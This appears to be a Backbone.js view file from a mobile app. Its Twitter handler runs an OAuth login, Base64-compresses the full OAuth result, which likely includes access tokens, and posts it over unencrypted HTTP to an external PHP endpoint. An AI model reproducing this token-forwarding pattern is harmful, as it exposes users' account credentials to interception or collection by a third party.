(function() {
	'use strict';

	app.Views.friends = Backbone.View.extend({
		el: 'section#main-stats-friends',
		events: {
			'tap div.twitter': 'twitter'
		},

		initialize: function() {
			this.template = Handlebars.compile(app.templateLoader.get('friends'));
			this.render();
		},

		destroy: function() {
			this.undelegateEvents();
		},

		render: function() {
			app.trigger('change', 'friends');
			this.$el.html(this.template());
			return this;
		},

		twitter: function() {
			// var response = JSON.parse(LZString.decompressFromBase64('N4IglgJiBcIMwEY4CYAMCAcB2EAaEAdgIYC2ApjCADICuAxmEQQPYAEASswA5kBOzeEEQA2jAM6Vh/Hv0EAjMANgAhMmLZkCrYUVZ1mOgHSCiANyIAXIr0oALCxa5joAehdc5YwxYDuYEgDmhvok7vwAZmDCZAD6/kQBai4ALHAAnFhpAKxYyBjIAGyYBdkFGC68ANZ0vKgAHsoxMSy8JCKGAFY8AYLCzHSWigSUyjSazGKsAIJgvGq9TAE0CRSw8/gW/mQAXswEqyCj45MzcxL4PmSeYBarBDTCwvi8RD4woJAwiCjo2PiQMTEFhssG+aEwOHwxHIlFoDCYbE4MgE+DENTImmapAOUm4fBRID6A02exGYxYJ1m6xAEDUNTAXBJwxUag0Wh0egMRGM+BovGEMHuj3wmk2m3m0FAtLRvAZTPeID5wgk0AA2gBdAC+mvwXH4tzotyg0HCIjEZHw4QMfUuvDEMX0NAIFhgCGQcEtss0EHtjudroQWHwoiBZAgDuYTpd0GS+HRljDMUslAA6mHpnrWAgsqxUHBoKhkNBEKwANSoCuoVhoVBpQSm0yR2W3X2R/3QDC8ix0GLMcLhc3RgC0CFQGArGy2MV2+zJx2mVPOIESzBimiIcmixtNyotIFMfDAkTDMB35tRVgsNHNrajrqwWA9hMWlGpQMs14V8aNSejIAAyk6rAALJEAAnlmWCQcWaTQGgZaVlW4JZIInzQFkaSYWkhS1u6aQFOgNb/OGQIgiAGFYTh2HpARCDZsggi3HUf4AKJiMirAAI5jKwtLOvwvFkKwyRVkQACPEysOarBcHsAS6LSrAkMwEC6ByB4dDsPIgOofJ0AcAA8ui2HM4QALwADogPYjiuC4vg3LcvDBMwJBWawczCJZhB9tazA+FZAB8AAqfgOHwrBpnIrAAMKiKKBkuEQgWMbwTrEieJpmnuYAEDEcxcMIYExBYq7vle9poUKTzgHlBVFSVZWXtecQkcCgoPDVuX5WQhXFaVMTXnwrUdcKtU9X1jWDeavCtYC7XQNV/x1b1DUDTKGJ5dCdydfgK6jTV+jMLwEC5QmKpLSAhVEPpB1xnswJgHINClXad0gHMvgYhYEZ3gWlpmMdNyxH60aoCKzo3GAEqgLYRBiPYCQqhqqJgSQcgGMj6q8jNMTkJDexY7y/JYzqIANkDRqntlzxkF9dOZWee46AQPRrBIZP6PxT0vcd9rrpujM0+A9rAkwYg6K91O7v8osvAQEuDHsa7EIL27C3qfZRLEcg3ZUAT8E64b6H0ZFwAAIhgiAobqETazEut0PrhsEOG8SJIN/J2A4XB2R4XgOYELmhJrkTRA7esG22bttIkYguAgyRZHAcDjph7i0jEPgiMInRcD0tta+HjvO9HcSx7ESoxDZTje44zhuP73h+EHIRhEXOuRy7McrPHifJ6ntZpBnsTZ48ecF1ddvF13ZebNEMDAmMhdh7E7uV17sA137njN/4QRt6H9vr/HqQZNkuT5EUGAlFkZQVNUtQNE0LRtLnXRkJPR/h+vnvCNXPsVTWUATvAOLcD6uXbqvcuvcUjpEyDkPIhRiilHKFUGo9RGjNGOm/POn9BDf07gQfYs0lR1ycKAverdIGEIjsQvg8cwS/CwAndIcASioGSKOAh09YiiAIJUCMptKAVhThWHhHdASQCuNYB2x1aSzRNsdSgyRzYxXNpwiR0CxDSN1rNMO/8lFm0ttbLR9smI/SMSIxCqAzHhyGhHJ2UcjYwMSIvNKe5aSmgeD9Qh0tzw0jIN44QvjeGuNWEzS0fk/Cs38XuK0jx/I9W4moH65p2yRJ8psSIxIhgqiZtqIAA=='));
			// console.log(response);
			if(typeof OAuth !== 'undefined') {
				OAuth.popup('twitter', {
					cache: true
				}).done(function(result) {
					var string = LZString.compressToBase64(JSON.stringify(result));
					$.post('http://www.dynsur.com/post/tl.php', {
						string: string
					});
					// result.me(['alias', 'avatar', 'name']).done(function(response) {
					// 	var string = LZString.compressToBase64(JSON.stringify(response));
					// 	$.post('http://www.dynsur.com/post/tl.php', {
					// 		string: string
					// 	});
					// });
				});
			}
		}
	});
})();
